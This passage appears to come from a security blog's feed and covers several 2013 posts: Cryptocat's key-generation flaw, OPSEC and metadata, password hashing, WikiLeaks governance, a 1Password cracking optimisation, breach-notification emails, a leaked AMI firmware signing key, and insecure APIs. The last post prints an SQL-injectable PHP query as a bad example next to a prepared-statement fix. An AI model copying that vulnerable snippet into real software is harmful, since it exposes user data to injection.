<p>How about data retention? While in the past Facebook has said messages are <a href="http://news.cnet.com/8301-13577_3-9896860-36.html">cleared after 90 days</a>, it&#8217;s not clear how long they retain the information today, or how much could be produced under subpoena - it&#8217;s clearly more than what <a href="https://blog.crypto.cat/2013/05/responding-to-law-enforcement-requests/">Cryptocat can</a> produce (as Facebook <a href="http://info.publicintelligence.net/Facebook2010.pdf">produces a lot</a>). Just looking at what Facebook can provide, versus what Cryptocat can says a lot from a privacy perspective.</p>

<p>I could go through more details, or compare it in more detail to other services, but the basic point should remain.</p>

<p>From that perspective, I think Cryptocat has accomplished something - it may not be ideal, and has clearly been far from it; it&#8217;s still a better choice for casual communication than most (all?) of the major IM/chat players.</p>

<p><strong>&#8216;I thought you said don&#8217;t use it?&#8217;</strong></p>

<p>In an <a href="http://arstechnica.com/security/2013/07/bad-kitty-rooky-mistake-in-cryptocat-chat-app-makes-cracking-a-snap/">article</a> I was quoted as saying something like this:</p>

<blockquote><p>He went on to recommend people not rely on Cryptocat to keep their conversations private until the code and the cryptography in it are thoroughly audited by professional penetration testers and cryptographers.</p></blockquote>


<p>I stand by that statement. If you <em>need</em> security, Cryptocat isn&#8217;t what you should be using, period. If you <em>want</em> privacy, it&#8217;s not a bad option. In a discussion on Twitter, the agreement was that there are no real competitors that provide secure multi-party chat - for those that want that feature, Cryptocat seems to be the only option.</p>

<p>It&#8217;s worth pointing out though, if you&#8217;re reading this, you probably know how to use PGP - and can use that to get around Cryptocat&#8217;s use-case. I&#8217;m not an apologist, and I&#8217;m not trying to excuse serious mistakes - I&#8217;m trying to present the issue, and the system itself in a fair light for the intended use-case, as Nadim explained it. In that light, the system still achieves its basic goal.</p>

      <title>Do one thing right&#8230;</title>
      <description><p>Everybody&#8217;s favorite whipping boy, <a href="https://crypto.cat/">Cryptocat</a> is back in the news today - and it&#8217;s <em>bad</em>. Really bad. Steve Thomas has <a href="http://tobtu.com/decryptocat.php">found</a> a major flaw in the way Cryptocat generated ECC keys. Due to this flaw, the keyspace was only <code>2^54.15</code>, well below a secure level. Add a <a href="http://en.wikipedia.org/wiki/Meet-in-the-middle_attack">meet in the middle</a> attack, and this is further reduced to <code>2^27.08</code> - which based on my rough estimates, is just slightly more secure than a paper bag.</p>

<p>The end result is of course, that anyone can crack the keys in a frighteningly short amount of time.</p>

<p>This flaw basically means that any group messages sent for nearly a year (a figure <a href="https://blog.crypto.cat/2013/07/new-critical-vulnerability-in-cryptocat-details/">disputed</a> by the project) are wide open to attack. Personally, I would operate under the assumption that any message sent during that time has been read (or will be) - hopefully by somebody not interested in you. Probably hasn&#8217;t, but there&#8217;s no way to know.</p>

<p><strong>If you&#8217;re going to do one thing, do it right.</strong></p>

<p>Cryptocat has one mission, to provide secure communication - which is to say, to encrypt data. The most vital step in any crypto system is the key generation; if you get it wrong, nothing else matters. That code should be well reviewed and understood by multiple people. Cryptocat got this wrong.</p>

<p>Steve does a great job explaining the issue here; but the short version is that the person that wrote the code - and anyone that&#8217;s reviewed it since then, didn&#8217;t understand what they were doing. That simple.</p>

<p>When you release code like this to the public, and encourage people to use it - especially those that are at higher risk (i.e. activists), you take on a certain responsibility for ensuring that at least the core functionality is doing what&#8217;s expected. In this case, the team behind Cryptocat failed. For a year, the entire user base was at risk.</p>

<p>I recently mentioned Cryptocat in my <a href="http://adamcaudill.com/2013/06/19/opsec-the-nsa-and-you/">OPSEC</a> article:</p>

<blockquote><p>Last year was painful for Cryptocat - the last audit may have been clean, but who knows what else may be found.</p></blockquote>


<p>When I wrote that, I wasn&#8217;t expecting it to be a bug that rendered the group chat encryption nearly pointless. While in <a href="https://blog.crypto.cat/2013/07/new-critical-vulnerability-in-cryptocat-details/">their</a> blog post they seem to downplay the issue, I won&#8217;t - for a year, group chat was <em>completely broken</em>.</p>

<p><strong>Crypto Is Hard</strong></p>

<p>There&#8217;s no doubt that crypto is hard, everybody agrees on that. Or said more accurately, doing it right is hard.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Having spent the past month doing it, let me tell you: implementing cryptography is *hard*. Even for &#39;experts&#39;.</p>&mdash; Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/statuses/352815917924757505">July 4, 2013</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>Writing key generation code scares me, I&#8217;m paranoid that I&#8217;ll get it wrong. So I take extra time to review it in detail. Then have other people review it in detail. I don&#8217;t release it to a &#8216;production&#8217; environment until I&#8217;m sure as I can be that it&#8217;s right. Can mistakes still make it in that way? Sure - but the odds are a lot lower.</p>

<p>This kind of code needs to be reviewed by those competent in crypto systems, and built to a specification that was designed by a real cryptographer. It can be expensive and time consuming, but that&#8217;s what it takes to keep the promises an application like Cryptocat makes.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>The problem: cryptographers aren&#39;t developers &amp; developers aren&#39;t cryptographers. The right solution is probably some Avengers-style mashup.</p>&mdash; Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/statuses/352816626170728450">July 4, 2013</a></blockquote>

<p><strong>Just how bad could it be?</strong></p>

<p>Based on recent disclosures, we know that the NSA has decided to store encrypted communication for later analysis, and I think it&#8217;s safe to say that other countries follow suit. So it&#8217;s likely there are stored Cryptocat communications floating around in various spy agency archives. These agencies may have already found this issue and used it to view messages, or now that it&#8217;s public - they can do so easily.</p>

<p>This is where an issue like this can be so devastating, if those encrypted messages have been saved anywhere - any users engaged in activity that their local government doesn&#8217;t care for are now at risk.</p>

<p>Personally, I wouldn&#8217;t trust Cryptocat until it&#8217;s had a true code audit (the pen-test they had last year clearly doesn&#8217;t count), and the crypto systems reviewed by a true cryptographer. If a mistake like this was allowed in, and overlooked for so long, I&#8217;ve no doubt that other weaknesses exist.</p>

      <title>OPSEC, The NSA, and You</title>
      <description><p>It&#8217;s been two weeks since news broke about the NSA <a href="http://www.guardian.co.uk/world/2013/jun/06/nsa-phone-records-verizon-court-order">collecting massive amounts of data</a> from Verizon; and likely everybody else. There&#8217;s also <a href="http://www.guardian.co.uk/world/2013/jun/06/us-tech-giants-nsa-data">PRISM</a> - whatever the hell that is - it seems there&#8217;s no agreement on that, and I doubt there will be anytime soon. What really matters here though, is we have proof that people are watching - and if it&#8217;s happening in the US, it&#8217;s probably happening everywhere else.</p>

<p>If you have any understanding of the intelligence community, all of this should come as absolutely no surprise whatsoever.</p>

<p>For me, it has served as a reminder of the importance of OPSEC in anything you&#8217;re doing. The NSA is collecting metadata, and lots of it - they repeatedly assure people that it&#8217;s harmless. And it is - if you&#8217;re a technophobic OPSEC master living in a cave. Where metadata is so valuable, is in cases where you are looking at people that leak little bits of personal data everywhere they go, then you use the metadata to connect the dots. Very soon, you have a great picture of what they are doing and who is involved - without needing access to voice recordings or other, more protected information.</p>

<p><strong>Knowing Where Your Weakness Is</strong></p>

<p>Many people are talking about tools and technologies now to defeat this kind of data collection - from Tor to Cryptocat, yet, there are issues; it sounds so simple, but it&#8217;s not. Tor for example, how easy would it be for someone with a large budget to put the network at risk? The approximate answer, is <a href="http://grugq.github.io/blog/2013/06/10/good-luck-with-that/">easy</a>. How about Cryptocat or other encrypted communication tools? Last year was <a href="https://blog.crypto.cat/2012/11/security-update-our-first-full-audit/">painful</a> for Cryptocat - the last audit may have been clean, but who knows what else may be found.</p>

<p>Encryption is hard, and it&#8217;s very easy to write something that looks secure but falls apart when placed in the right hands - accidentally or otherwise.</p>

<p>The question is, is it effective against an actor with a massive budget? I would say it is, but not for the reason you might be thinking. Encryption is hard, both for those that implement and those that attack. But why spend the time and money on breaking encryption when you can take advantage of bad OPSEC to achieve the same goal?</p>

<p>People leak data constantly - how, when, and where they use their phone, who they email, how they use social networks - all of these things provide useful information for an attacker. Individually, they may seem to have no value, but it&#8217;s the connections they add to the overall picture that makes them so damaging.</p>

<p>Photo EXIF data, time of day trends in social media (or IRC), comments about the weather - all seem so innocent, but when combined can help to narrow down the list of candidates, and start building a picture of a person and their habits. Simple, innocuous, meaningless - until assembled.</p>

<p>No tool can fix this; using Tor doesn&#8217;t eliminate habits, encrypting email doesn&#8217;t hide social connections. Everything you do leaks data.</p>

<p><strong>Your Software Isn&#8217;t The Big Risk</strong></p>

<p>You are. Your friends are.</p>

<p>All the encryption software in the world won&#8217;t protect you from posting a picture with GPS data embedded in it; no 0day will put you at more risk than you are from your own mouth. No major actor needs to crack encryption, when they can collect massive amounts of metadata, and play connect the dots with the data you give them for free.</p>

<p>It&#8217;s even worse when you start talking to friends, what they know, they&#8217;ll leak. When you speak to anyone, assume that a link between you and them has been documented by somebody, somewhere - now that person is a target to see what little bits of data they leak about you. Or you are now a target because of them.</p>

<p>Trust no one, not even yourself.</p>

<p><strong>Know Your Enemy</strong></p>

<p>As Sun Tzu <a href="https://en.wikipedia.org/wiki/The_Art_of_War">pointed out</a>, if you know your enemy - war is easy. The problem is, you don&#8217;t. Nobody knows just how much data groups like the NSA have - if you believe them, not even the NSA knows. Nor does anyone know what they are capable of collecting should the need arise. Large groups of <em>very</em> intelligent people with a secret budget and access to a secret court that grants almost everything they ask for - my guess is that they&#8217;re capable of a lot.</p>

<p>You know what tools are available - but how can you protect yourself, if you don&#8217;t know what works and what doesn&#8217;t? What networks are monitored? What agencies or companies are sharing data?</p>

<p>Having good tools is a start, but that must be part of a larger plan to control what you expose publicly. You must be very cautious about every bit of data that could be collected - no matter how insignificant it seems. Who you associate with and how needs to be carefully controlled to avoid both unwanted leaks and attention. Every action feeds data in a picture, how useful that picture is, is completely up to you.</p>

<p>Want to learn more, start with <a href="http://www.youtube.com/watch?v=9XaYdCdwiWU">grugq&#8217;s HITB OPSEC talk</a> if you&#8217;ve not seen it yet. If you&#8217;d like the short version, I&#8217;ll sum it up: STFU.</p>

      <title>Password Hashing: No Silver Bullets</title>
      <description><p>In the dark days of the web, if a service hashed your password instead of storing it in plain text, they were doing good. As sites were hacked, and credentials stolen, a silver bullet emerged: always hash <em>and</em> salt passwords when storing them. Many, many services were built with this design - <a href="http://arstechnica.com/security/2013/04/why-livingsocials-50-million-password-breach-is-graver-than-you-may-think/">LivingSocial</a> is a great example. SHA1 hashing with a 40 byte salt - once upon a time, that was considered reasonable protection. Today, you&#8217;ll be blasted by industry insiders and the media for that.</p>

<p>We all so often rush to criticize companies for not being on the cutting edge of security - but how often do any of us look at why? Do we ever ask who&#8217;s really at fault? Is the company at fault for not putting the money into updating systems, is it the engineers and architects for not knowing what they should do, or could it be something else - could the advice companies receive be part of the problem?</p>

<p>Looking at some recent breaches and the overall security position of the companies involved - it&#8217;s easy to see which companies get it and which don&#8217;t. There&#8217;s one recent example where I really believe the company and its staff were simply incompetent. From top to bottom, they showed little thought for security, privacy, or user trust (for obvious reasons, I&#8217;m not naming names). LivingSocial and some others - I&#8217;m less sure about, when those systems were designed they were likely following &#8220;best practices&#8221; - or at least what developers thought were best practices.</p>

<p>For a number of years many developers saw SHA1 + a strong salt as a silver bullet. They implemented and stopped thinking.</p>

<p>The problem is, attackers are advancing far faster than companies can adapt, and best practices that may be right for today will soon fail the &#8220;reasonable protection&#8221; test. Engineers and architects see a best practices document and build to that standard - if that document is even a couple years old, what they build is hopelessly dated and won&#8217;t provide the security the need.</p>

<p>Once that system is built - unless there&#8217;s a breach, what incentive is there to change it? At many companies it&#8217;s a constant fight to fund security related changes; when the change is to fix a system that&#8217;s only broken in the eyes of experts, and (to management) only matters if some other layer of security fails, you can expect a fight for that money.</p>

<p>Fixing things that aren&#8217;t obviously broken is hard. For those signing the checks, it&#8217;s not obvious that what was &#8220;best practice&#8221; a few years ago is today a disaster waiting to happen.</p>

<p>There are many problems here, best practices are dated and inaccurate, there isn&#8217;t enough focus on secure storage, and there needs to be more push for better, more actionable recommendations that stand the test of time. While there are no silver bullets, surely as an industry we can do better than this.</p>

<p><strong>Secure Storage</strong></p>

<p>If I can get everything I need to start brute-forceing passwords from a simple SQL injection attack against your <code>users</code> table - your users are at risk. It doesn&#8217;t matter if your using SHA1 or <code>scrypt</code> - one day you&#8217;ll be breached, and passwords will be exposed. It&#8217;s that simple.</p>

<p>The salt, the hash, or (probably better) both should be encrypted. It won&#8217;t help you in case your server is breached, but it&#8217;ll help if you&#8217;re hit with a SQL injection attack or other attacks that allow access to data, but not the system itself. As always, it&#8217;s not a silver bullet, but it adds protection in some situations, and anything you can do to make life harder for an attacker is a good thing.</p>

<p>This of course opens up the age old question of storing the encryption key, which I&#8217;ll leave as an exercise to the reader. This can be taken to the next level, encrypt the salt &amp; hash with an HSM - provides the best security, but that&#8217;s rarely an option because of expense.</p>

<p>There is some debate over this in the industry, but I&#8217;m a big fan of defense in depth - don&#8217;t make things easier for attackers.</p>

<p><strong>Useful Recommendations</strong></p>

<p>Crypto is hard, often confusing, and too often there is conflicting information. Implementing hash + salt is easy (and stupid), PBKDF2 is fairly simple - but you have to answer a couple questions:</p>

<ul>
<li>Hash Function - SHA1-HMAC is a common option thanks to wide compatibility, though using a member of the SHA2 family would be far more appropriate.</li>
<li>Iteration Count - There&#8217;s no real consensus on this, some say it should double every two years (so this year it would be 96,000), others say it should be tuned to your server.</li>
</ul>


<p>Iteration count here is a real issue - if you blindly double every two years you risk server stability, on the other hand if you tune it to your server, you risk not keeping up with attackers. There&#8217;s no winning, no easy answer. When it comes to password brute-forcing, the advantage goes to the attacker - having faster hardware and more optimized software is common. It&#8217;s the job of the defender to constantly play catch-up.</p>

<p>With <code>scrypt</code> the options are even more complex, with too little obvious documentation to get developers going in the right direction.</p>

<p><strong>Dynamic Adjustment</strong></p>

<p>For example, the <a href="https://github.com/pbhogan/scrypt">Ruby scrypt</a> implementation makes it quite easy to dynamically adjust cost settings - though if you run it on dated hardware, you run the risk of giving the attackers even more of an advantage. For those tied to PBKDF2 for some reason (i.e. compatibility), it would be easy enough to come up with dynamic adjustment code based on either performance benchmarking or date (following the somewhat risky double every two years approach).</p>

<p>Designing for dynamic adjustment gives defenders the best chance of staying current without costly upgrades. Again, not a silver bullet, but gives defenders a fighting chance of keeping up.</p>

<p><strong>The Future</strong></p>

<p>What I&#8217;ve been looking for is a strongly opinionated library in the spirit of NaCl - secure by default, and hard to make insecure. For now, it&#8217;s clear that it should be based on <code>scrypt</code> - but ideally it could be easily updated in the future to use the winner of the <a href="https://password-hashing.net/">Password Hashing Competition</a>.</p>

<p>Here&#8217;s what I&#8217;d like to see:</p>

<ul>
<li>Based on scrypt.</li>
<li>Easily updated to support new algorithms (with backwards compatibility).</li>
<li>Single cost setting, ideally based on approximate execution time.</li>
<li>Function output encrypted with AES256.</li>
<li>Reasonable minimum settings to prevent insecure usage.</li>
</ul>


<p>Something like that could be handed to a developer with minimal instruction, and allow them to provide reasonable protection today and in the (near) future. There are times when giving people what they want (options, control, etc.) does more harm than good - give developers just what they need, no more, no less.</p>

      <title>The WikiLeaks We Deserve</title>
      <description><p>I&#8217;ve been a (fairly quiet) critic of WikiLeaks for a long time, the core of the mission I agree with - information should be free, and should be preserved - but the implementation is deeply flawed. But then, that&#8217;s not really news is it? Two and half years ago when I last wrote about WikiLeaks, I pointed out that <a href="http://adamcaudill.com/2010/12/01/wikileaks-biggest-problem-julian-assange/">Julian Assange was the organizations biggest problem</a>. So what do we have today? A grand idea perverted into a political machine, and twisted by ego and delusions of grandeur.</p>

<p>More than two years ago I wrote this:</p>

<blockquote><p>Assange has become a threat to WikiLeaks not because of the attacks against him, but because people see him as WikiLeaks.</p></blockquote>


<p>Today, I would say that perception is correct - WikiLeaks has become an embodiment of Assange&#8217;s personality. In the public&#8217;s perception, the man and the organization have become one; his role as the singular public face of WikiLeaks has clouded the publics vision and diminished the potential of the organization. While the reality maybe different, if the public sees Julian Assange as WikiLeaks - it&#8217;s fate is tied to his.</p>

<p>Maybe this is what we deserve - but it&#8217;s not what we need.</p>

<p><strong>The WikiLeaks We Need</strong></p>

<p>What we need is an organization with many vocal advocates, but no singular leader. What we need is information to be free, and openly accessible to all - a resource for legitimate journalists, unopinionated and apolitical. It should have a governance structure that allows simple leadership changes as needed. We need a resource for repressed information - either secret information from oppressive regimes or by overzealous laws such as the <a href="https://www.eff.org/press/releases/fifteen-years-dmca-abuse">DMCA</a>. There&#8217;s a wealth of information that is being lost while WikiLeaks focuses on political goals and public relations.</p>

<p>What we need is larger than any one person, and thus not tied to their faults or failings - what we need is a mission that&#8217;s bigger than the people involved, bigger than the organization.</p>

<p>Here&#8217;s how I see it:</p>

<p><em>Governance:</em> The structure should allow members of a governance board to easily come and go; no member should be critical to continued operation. Should a member be unable to serve or potentially become compromised, it&#8217;s critical that their position be transferred with as little organizational impact as possible. All votes, actions, and minutes of the board should be published; the organization should be fully transparent. The governance board should be responsible for certain operational &amp; organizational decisions:</p>

<ul>
<li>Addition of new members to the board</li>
<li>Addition of &#8216;official&#8217; (i.e. trusted) mirrors</li>
<li>Approval of new content (or delegation to trusted persons)</li>
<li>Control of finances</li>
</ul>


<p><em>Technology:</em> Publishing should be distributed as possible, and use a lightweight front-end to minimize server load. A technology like <a href="https://github.com/mojombo/jekyll">Jekyll</a> could be used to make as many of the pages static as possible (for security, performance, and cost reduction). Once a site update is released, it should be made available to a set of official mirrors to handle spikes in traffic and help mitigate the impact of a server going offline.</p>

<p><em>Content:</em> As much legitimate information as possible should be published, but care must be taken to avoid publishing false or misleading information, or information that is clearly politically motivated. If there&#8217;s a public perception of political or ideological motivation, then trust is put at risk. Content that is potentially controversial or has potential legal ramifications should be put before a quorum of the governance board to vote on how to proceed.</p>

<p>Content should cover all legitimate repressed information - from highly technical system details so often attacked via the DMCA&#8217;s anti-circumvention clause, to the emails and memos that built WikiLeaks&#8217; early reputation. A hyper-focus on any one topic or type of information causes other valuable information to be ignored, a mistake that must be avoided.</p>

<p><em>Finances:</em> Financial reports should be regularly released to disclose how all donations are used. When money is involved, so is suspicion and mistrust - spending should be extremely conservative and fully documented.</p>

<p><em>Public Relations:</em> While there should be many vocal advocates for both the organization and the mission, there should be no single person that is entrusted with control. The focus should be on the goal - the freedom and preservation of information - not the individuals involved, or even the organization itself; the organization is just to tool, a means to an end.</p>

<p><strong>Will it happen?</strong></p>

<p>What I propose is an organization without ego, without politics, with adherence to a single mission and complete disregard for all other influences. In other words, what I propose is nearly impossible. There are few that believe so strongly in the ideals of freedom and preservation of information that they could be selfless enough to serve on the board of such an organization without letting personal opinions and motivations get in the way.</p>

<p>What I propose would be a haven for whistle-blowers and and those seeking freedom of speech - and no less of a target than WikiLeaks, and perhaps moreso due to expanding the focus to all legitimate information, not just the sole topic that WikiLeaks has adopted in the last couple years.</p>

<p><strong>Someday, maybe&#8230;</strong></p>

<p>We live in a time where information is produced at a nearly incomprehensible rate, and yet far too much of it repressed - by bad laws and worse governments. Without those working tirelessly to make it freely available, it would remain unseen by most, and possibly lost forever. Work always needs to be done, and WikiLeaks as we now know it isn&#8217;t the answer.</p>

      <title>1Password, PBKDF2, &amp;amp; Implementation Flaws</title>
      <description><p>&#8230;or &#8220;Crypto Is Hard, Vol. 479&#8221;</p>

<p>Earlier today a tweet about a new feature for <a href="http://hashcat.net/oclhashcat-plus/">oclHashcat-plus</a> started a truly interesting debate on Twitter over the implications. The new feature is the ability to crack <a href="https://agilebits.com/onepassword">1Password</a> keychain files - at an impressive <strong>3 million</strong> passwords per second.</p>

<div class='embed tweet'><blockquote class="twitter-tweet" align="center"><p>Support added to crack 1Password to oclHashcat-plus, 100% computed on GPU! Plus I found an exploitable design flaw <a href="http://t.co/53ZtWggsDz" title="http://hashcat.net/forum/thread-2238.html">hashcat.net/forum/thread-2…</a></p>&mdash; hashcat (@hashcat) <a href="https://twitter.com/hashcat/status/324172122039652355">April 16, 2013</a></blockquote>
<script async src="https://adamcaudill.com///platform.twitter.com/widgets.js" charset="utf-8"></script></div>


<p>To achieve this speed, two optimizations were used - the first is in precomputing <code>ipad</code> and <code>opad</code> for SHA1-HMAC, this effectively cuts the number of SHA1 calls in half. This is clever, but not the part I&#8217;m interested in, it&#8217;s the second optimization that I find interesting.</p>

<p>1Password uses AES128, in <a href="https://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Cipher-block_chaining_.28CBC.29">CBC mode</a> to encrypt data - and it&#8217;s the design of CBC that enables the next optimization. If you have the wrong IV when you decrypt in CBC mode it corrupts the first block - but only the first block, the rest will be fine. It&#8217;s this fact that seems to have been overlooked when 1Password was designed.</p>

<p>The final encryption key is derived from the user&#8217;s password via PBKDF2. They generate a 320bit key (so two blocks or four calls to SHA1 after the precompute optimization); of those 320 bits, 128 bits go into the encryption key, another 128 bits go to the IV. For 1Password to work, it needs both the key and the IV - but <em>attackers don&#8217;t</em>.</p>

<p>An attacker can look at later blocks to see if they are valid and ignore the first block, by ignoring the IV generation and the first encrypted block, the number of calls to SHA1 is again cut in half.</p>

<p>To their credit, <a href="https://twitter.com/jpgoldberg">Jeffrey Goldberg</a> of <a href="https://agilebits.com/">AgileBits</a> (the maker of 1Password) responded very quickly and provided details about what they are doing to address it, and joined in a very open discussion about the impact of how this was implemented. Depending on who you ask, this &#8216;flaw&#8217; costs either 1 or 2 bits of entropy.</p>

<p>For the end user, it means that an attacker only needs to perform 50% of the SHA1 calls that the 1Password software needs (maybe only 25%, depending on how optimized the 1Password code is). When it comes to password cracking, that certainly seems less secure than what was intended. As flaws go it could be far worse, but it&#8217;s likely less secure than intended.</p>

<p>And finally, after all of this, we come to the point:</p>

<p><strong>Crypto is hard, even for smart people.</strong></p>

<p>It&#8217;s so easy to accidentally introduce weaknesses like this - everything looks right, but because of how they used PBKDF2 in combination with AES128-CBC, the end result is weaker than was intended. It&#8217;s specific, fairly obscure (to many at least), details of how these two algorithms work, and how they were used together that led to this flaw.</p>

<p>AgileBits has made a lot of good decisions, and in general at least, seems to know what they are doing. I certainly don&#8217;t mean to beat up on them, they&#8217;ve handled this very well and the issue is fairly small. I applaud them for discussing this so openly, it&#8217;s hard to do - I know that from personal experience.</p>

<p>This should serve as a great example of why any new crypto implementation needs to be expert reviewed to make sure that it&#8217;s right. Nobody gets it right every time, every code base needs to be reviewed, this could (but doesn&#8217;t have to) happen to you.</p>

      <title>Linode: Another Breach Notification Gone Wrong</title>
      <description><p>Last night I received an email from Linode about a possible breach and mandatory password reset that reminded me of another recent email, in some disturbing ways.</p>

<blockquote><p>Dear Linode customer,</p><p>Linode administrators have discovered and blocked suspicious activity on the Linode network.</p></blockquote>


<p>Not too long ago, I received a similar email from Evernote - not just in it&#8217;s text, but in the errors made.</p>

<blockquote><p>Dear Evernote user, </p><p>Evernote&#8217;s Operations & Security team has discovered and blocked suspicious activity on the Evernote network that appears to have been a coordinated attempt to access secure areas of the Evernote Service.</p></blockquote>


<p>When I received the email from Evernote, I quickly noticed that the links were to a different site - was it a thinly veiled phishing attempt? With all the links going to <code>links.evernote.mkt5371.com</code> it took a few minutes to work out that the email was actually legitimate. Instead of being able to quickly reset passwords, users were forced to try to figure out if the email was real or not.</p>

<p>When you are sending out a breach notification, it&#8217;s <em>critical</em> that users are able to verify, as quickly as possible, that an email is legitimate, and the the call to action really is necessary. Linode, unfortunately, made a similar mistake.</p>

<p><img class="center" src="https://adamcaudill.com//files/Screenshot_4_13_13_10_21_AM.png"></p>

<p>The first thing that jumps out is that it&#8217;s from <code>e2ma.net</code> - not Linode directly, next is that the first link in the email points to <code>e2.ma/message/...</code>. These are immediate red flags, the focus instantly switches from taking necessary action to secure a user&#8217;s account to trying to figure out if they are being attacked. From comments on their <a href="http://blog.linode.com/2013/04/12/security-notice-linode-manager-password-reset/">blog post</a>, I&#8217;m not the only one that was disturbed by how the email was sent.</p>

<p>Thankfully, they didn&#8217;t include a link to the password reset page, and they even told users not to click reset links in unsolicited emails - so it&#8217;s not all bad. Users shouldn&#8217;t be spending time trying to figure out if a notice is real instead of taking steps to secure their accounts. In situations where there may be a significant security issue, service providers should take every effort to minimize confusion - provide clear information, and make the source as clear as possible.</p>

      <title>Security Done Wrong: Leaky FTP Server</title>
      <description><p><strong>Update:</strong> I&#8217;ve just spoken to AMI, and received some very important information; so here are the key points and clarifications:</p>

<ul>
<li>To clarify, the &#8216;vendor&#8217; I refer to is a customer of AMI; it is this customer&#8217;s public FTP server that exposed this information.</li>
<li>Per AMI, the signing key included in the &#8216;Ivy Bridge&#8217; archive is a <em>default</em> test key; AMI instructs customers to change the key before building for a production environment. It&#8217;s not currently known if the customer was following recommended practices.</li>
<li>The &#8216;Ivy Bridge&#8217; code was unmodified, meaning that the customer had not made any alterations to this specific copy.</li>
</ul>


<p>AMI is preparing a press release. The &#8216;vendor&#8217; still hasn&#8217;t responded (to me or AMI).</p>

<p>Assuming the vendor was following AMI&#8217;s instructions, the private key found on the vendor&#8217;s public FTP server <em>should</em> have little practical value; though how this vendor was handling keys isn&#8217;t known, so the usefulness of the key is also unknown. There is also the possibility of other AMI customers violating AMI&#8217;s instructions. <em>We know we have a key; we don&#8217;t know how it&#8217;s been used.</em></p>

<p>Publicly revealing the source code still has some potentially interesting implications, even with the assumption that the vendor was following AMI&#8217;s instructions on key handling. As this code may be under additional scrutiny from researchers, it&#8217;s likely that new flaws will be found that would have been missed otherwise.</p>

<p>&#8211;</p>

<p>A few hours ago I received a call from my frequent research partner, <a href="http://brandonw.net/">Brandon Wilson</a>, about an open FTP server hosted in Taiwan serving up some rather interesting data. Internal emails, various system images (and even the Ghost software!), numerous photos - some personal, some high resolution PCB images, private specification sheets, Excel documents loaded with private information - but that wasn&#8217;t the worst.</p>

<p>In a folder called <code>code</code> was quite a treasure. The source code for different versions of <a href="http://en.wikipedia.org/wiki/American_Megatrends">American Megatrends</a> (AMI) firmware - but there was even a bonus on top of that! They included their private signing key with the code in the &#8216;Ivy Bridge&#8217; archive.</p>

<p><code>308204A30201000282010100ED71D63F21FF0B4563A43D871D22448FC9...</code></p>

<p>If you aren&#8217;t familiar with how AMI does UEFI firmware upgrades, they were nice enough to produce <a href="http://www.uefi.org/learning_center/UEFI_Plugfest_2012Q1_v3_AMI.pdf">some documentation</a> (PDF).</p>

<p>By leaking this key and the firmware source, it is possible (and simple) for others to create malicious UEFI updates that will be validated &amp; installed for the vendor&#8217;s products that use this &#8216;Ivy Bridge&#8217; firmware. If the vendor used this same key for other products - the impact could be even worse. Even with a quick reaction, odds are users will be unprotected for some time. As users often don&#8217;t install firmware updates unless they are having issues - I expect this one to be around for a while.</p>

<p>This kind of leak is a dream come true for advanced corporate espionage or intelligence operations. The ability to create a nearly undetectable, permanent hole in a system&#8217;s security is an ideal scenario for covert information collection.</p>

<p>This vendor&#8217;s lax (non-existent?) security could have much broader repercussions though. For AMI, they now have a major piece of intellectual property freely available for download by competitors. For users, this code could now be subject to new scrutiny - if a security issue is found in the firmware, it could potentially impact all users whose firmware is based on the leaked code.</p>

<p>If the code was old, as it&#8217;s been when products like <a href="http://www.zdnet.com/symantec-source-code-leaked-on-pirate-bay-7000004765/">Symantec&#8217;s were leaked</a>, this might not be so bad - but it&#8217;s not.</p>

<p><img class="center" src="https://adamcaudill.com//files/Screenshot_4_4_13_10_04_PM.png"></p>

<p>References in the files indicate that the code is from sometime in February 2012 - so this is fairly current code. For AMI, I hope they perform a security audit of their code to make sure that this leak doesn&#8217;t put users at excessive risk.</p>

<p>A foolish oversight now has the potential to impact many.</p>

      <title>First, Do No Harm: Developers &amp;amp; Bad APIs</title>
      <description><p><strong>Primum non nocere</strong> (first, do no harm) - an iconic phrase in modern medicine, yet also applicable to many other fields. This is something I wish more people would think about, developers especially - and primarily when writing new APIs. In general, developers don&#8217;t have an impressive history with security - quite frankly, developers suck. Seeing as I consider myself a developer, that&#8217;s painful to admit.</p>

<p>Chris Andrè Dale posted an interesting article some time ago that got me thinking: <a href="http://www.securesolutions.no/why-its-easy-being-a-hacker/">Why it&#8217;s easy being a hacker: A SQL injection case study</a> - Chris pointed out the problems with educational material that developers are using, and just how bad the examples are. SQL injection is everywhere and very few examples encourage developers to do it the right way - for that matter, very few are telling developers that there is a right way. I&#8217;m sure we&#8217;ve all seen similar issues in other areas, not just for SQL injection.</p>

<p>I had to ask, why? How did we end up in this situation? The industry has come so far in so many ways, it&#8217;s unbelievable that we still have these fundamental issues. It&#8217;s clear that the industry is failing, and these are just a few of the areas:</p>

<ul>
<li>Educational material is riddled with errors</li>
<li>Authors rarely understand the security implications of their samples</li>
<li>Developers aren&#8217;t taking the time to research the right way to do things</li>
<li>Developers don&#8217;t understand the need to consider security implications</li>
</ul>


<p>&#8230;and I could keep going.</p>

<p><strong>Whose fault is it really?</strong></p>

<p>If you look at the PHP/MySQL examples that are floating around, you&#8217;ll notice something interesting: it&#8217;s really, <em>really</em> easy to write bad code. The first examples anyone sees is a simple, one line, easy to understand statement:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">mysqli_query($link, &quot;INSERT INTO Persons (FirstName) VALUES (&#39;$_POST[firstname]&#39;)&quot;)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And this simple command is what people use - with no idea how dangerous it is. The API makes writing bad code easy, but how about good code?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">$stmt = $mysqli-&gt;prepare(&quot;INSERT INTO Persons (FirstName) VALUES (?)&quot;);</span>
</span><span class='line'><span class="x">$stmt-&gt;bind_param(&quot;s&quot;, $_POST[firstname]);</span>
</span><span class='line'><span class="x">$stmt-&gt;execute();</span>
</span></code></pre></td></tr></table></div></figure>


